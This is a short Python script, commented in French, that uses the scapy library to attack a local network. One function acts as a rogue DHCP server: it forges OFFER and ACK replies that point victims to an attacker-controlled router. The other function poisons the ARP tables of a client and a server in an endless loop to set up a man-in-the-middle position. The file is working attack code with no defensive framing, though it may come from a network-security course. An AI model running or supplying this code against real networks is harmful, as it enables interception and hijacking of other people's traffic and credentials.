#!/usr/bin/python3

"""Module Utilise pour l'Attaque"""
import sys
import time
from scapy.all import ARP, Ether, srp1, sendp,sniff,hexdump,DHCP,IP,UDP,BOOTP

def dhcp(ip, ip_victime):
    """
    Fonction qui analyse les paquets dhcp
    """
    def dhcp_reply(paquet):
        """
        Fonction qui forge des Ack et OFFER
        """ 
        if DHCP in paquet and paquet[DHCP].options[0][1] == 1:
            reply = Ether(dst=paquet[Ether].src) / IP(dst=ip_victime) / UDP(dport=68
                , sport=67) / BOOTP(op=2, yiaddr=ip_victime, 
                xid = paquet[BOOTP].xid) / DHCP(options=[("message-type", "offer"), 
                ('subnet_mask', '255.255.255.0'),('router', '{}'.format(ip)),
                ('server_id', '192.168.43.9'),('lease_time', 3600),('end', 255)])
            sendp(reply, iface='eth0')
            return(hexdump(reply[DHCP]), reply[DHCP])
        elif DHCP in paquet and paquet[DHCP].options[0][1] == 3:
            reply = Ether(dst=paquet[Ether].src) / IP(dst=ip_victime) / UDP(dport=68
                , sport=67) / BOOTP(op=2, yiaddr=ip_victime, 
                xid = paquet[BOOTP].xid) / DHCP(options=[("message-type", "ack"), 
                ('subnet_mask', '255.255.255.0'),('router', '{}'.format(ip)),
                ('server_id', '192.168.43.9'),('lease_time', 3600),('end', 255)])
            sendp(reply, iface='eth0')
            return(hexdump(reply[DHCP]), reply[DHCP])
    #recupere les paquets DHCP
    sniff(prn=dhcp_reply,
    filter="udp and port 68" , iface='eth0')

def atk(ip_client, ip_serveur):
    """
    Fonctions qui recupere les adresses mac du client et du serveur pour mettre
    celle de l'attaquant dans leurs tables ARP 
    """
    # recuperation de l'@ MAC du client
    requete = Ether() / ARP(pdst=ip_client)
    reponse = srp1(requete, timeout=5)

    if reponse is None:
        print("Le client n'est pas accessible")
        exit()

    mac_client = reponse[ARP].hwsrc

    print(ip_client, mac_client)

    # recuperation de l'@ MAC du serveur
    requete = Ether() / ARP(pdst=ip_serveur)
    reponse = srp1(requete, timeout=5)

    if reponse is None:
        print("Le serveur n'est pas accessible")
        exit()

    mac_serveur = reponse[ARP].hwsrc

    print(ip_serveur, mac_serveur)

    # on cree le paquet pour attaquer le client
    attaque_client = Ether(dst=mac_client) / ARP(psrc=ip_serveur)

    # on cree le paquet pour attaquer le serveur
    attaque_serveur = Ether(dst=mac_serveur) / ARP(psrc=ip_client)

    while True:
        sendp(attaque_client)
        sendp(attaque_serveur)
        time.sleep(2)

